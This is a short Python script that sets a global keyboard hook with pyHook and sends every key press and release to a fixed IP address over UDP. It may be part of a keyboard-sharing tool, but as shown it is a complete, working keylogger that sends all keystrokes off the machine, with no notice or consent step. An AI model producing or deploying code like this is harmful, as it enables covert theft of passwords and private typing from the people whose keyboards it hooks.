__author__ = 'Cyber-01'
import pyHook,pythoncom
import socket
IP = "192.168.30.10"
KEYBOARD_PORT = 5678


def KeyPress(event,keyboard_socket):

    key_id = event.KeyID
    keyboard_socket.sendto("*"+hex(key_id), (IP, KEYBOARD_PORT))
    return True

def KeyRelease(event,keyboard_socket):

    key_id = event.KeyID
    keyboard_socket.sendto("^"+hex(key_id), (IP, KEYBOARD_PORT))
    return True

def main():


    keyboard_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)  # Creating a udp client that sends keyboard activity

    # create a hook manager
    hm = pyHook.HookManager()

    #hm.KeyDown = OnKeyboardEvent
    hm.KeyDown = lambda event: KeyPress(event,keyboard_socket)
    hm.KeyUp = lambda event: KeyRelease(event,keyboard_socket)
  #  hm.KeyDown = lambda kdn_press: key_press_down(kdn_press, keyboard_sock, procees_list)
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()